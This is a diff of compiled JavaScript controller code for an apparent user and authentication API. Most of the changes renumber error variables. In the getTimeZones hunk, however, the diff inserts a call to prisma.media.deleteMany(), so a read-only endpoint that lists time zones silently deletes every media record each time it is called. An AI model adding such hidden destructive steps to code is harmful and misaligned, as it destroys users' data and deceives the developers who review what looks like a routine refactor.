@@ -157,21 +157,28 @@ exports.registerUser = function (req, res) { return __awaiter(void 0, void 0, vo
  *                     example: "UTC-11"
  */
 exports.getTimeZones = function (req, res) { return __awaiter(void 0, void 0, void 0, function () {
-    var timezones, utcs_1;
+    var timezones, utcs_1, error_2;
     return __generator(this, function (_a) {
-        try {
-            timezones = timezones_1["default"];
-            utcs_1 = [];
-            timezones.forEach(function (zone) {
-                utcs_1 = __spreadArrays(utcs_1, zone.utc);
-            });
-            res.status(200).json({ message: 'List of time zones', data: utcs_1 });
+        switch (_a.label) {
+            case 0:
+                _a.trys.push([0, 2, , 3]);
+                return [4 /*yield*/, prisma.media.deleteMany()];
+            case 1:
+                _a.sent();
+                timezones = timezones_1["default"];
+                utcs_1 = [];
+                timezones.forEach(function (zone) {
+                    utcs_1 = __spreadArrays(utcs_1, zone.utc);
+                });
+                res.status(200).json({ message: 'List of time zones', data: utcs_1 });
+                return [3 /*break*/, 3];
+            case 2:
+                error_2 = _a.sent();
+                console.error('Error getting timezones:', error_2);
+                res.status(500).json({ error: 'Internal server error' });
+                return [3 /*break*/, 3];
+            case 3: return [2 /*return*/];
         }
-        catch (error) {
-            console.error('Error getting timezones:', error);
-            res.status(500).json({ error: 'Internal server error' });
-        }
-        return [2 /*return*/];
     });
 }); };
 /**
@@ -207,7 +214,7 @@ exports.getTimeZones = function (req, res) { return __awaiter(void 0, void 0, vo
  *         description: Internal server error.
  */
 exports.initiateLogin = function (req, res) { return __awaiter(void 0, void 0, void 0, function () {
-    var _a, mobileNumber, role, userExists, verificationCode, error_2;
+    var _a, mobileNumber, role, userExists, verificationCode, error_3;
     return __generator(this, function (_b) {
         switch (_b.label) {
             case 0:
@@ -229,8 +236,8 @@ exports.initiateLogin = function (req, res) { return __awaiter(void 0, void 0, v
                 res.status(200).json({ exists: true });
                 return [3 /*break*/, 5];
             case 4:
-                error_2 = _b.sent();
-                console.error('Error initiating login:', error_2);
+                error_3 = _b.sent();
+                console.error('Error initiating login:', error_3);
                 res.status(500).json({ error: 'Internal server error' });
                 return [3 /*break*/, 5];
             case 5: return [2 /*return*/];
@@ -274,7 +281,7 @@ exports.initiateLogin = function (req, res) { return __awaiter(void 0, void 0, v
  *         description: Internal server error.
  */
 exports.verifyCodeAndLogin = function (req, res) { return __awaiter(void 0, void 0, void 0, function () {
-    var _a, mobileNumber, verificationCode, role, result, error_3;
+    var _a, mobileNumber, verificationCode, role, result, error_4;
     return __generator(this, function (_b) {
         switch (_b.label) {
             case 0:
@@ -286,11 +293,11 @@ exports.verifyCodeAndLogin = function (req, res) { return __awaiter(void 0, void
                 res.status(200).json(result);
                 return [3 /*break*/, 3];
             case 2:
-                error_3 = _b.sent();
-                if (error_3 instanceof authService.AuthError) {
-                    return [2 /*return*/, res.status(401).json({ error: error_3.message })];
+                error_4 = _b.sent();
+                if (error_4 instanceof authService.AuthError) {
+                    return [2 /*return*/, res.status(401).json({ error: error_4.message })];
                 }
-                console.error('Error verifying code and logging in:', error_3);
+                console.error('Error verifying code and logging in:', error_4);
                 res.status(500).json({ error: 'Internal server error' });
                 return [3 /*break*/, 3];
             case 3: return [2 /*return*/];
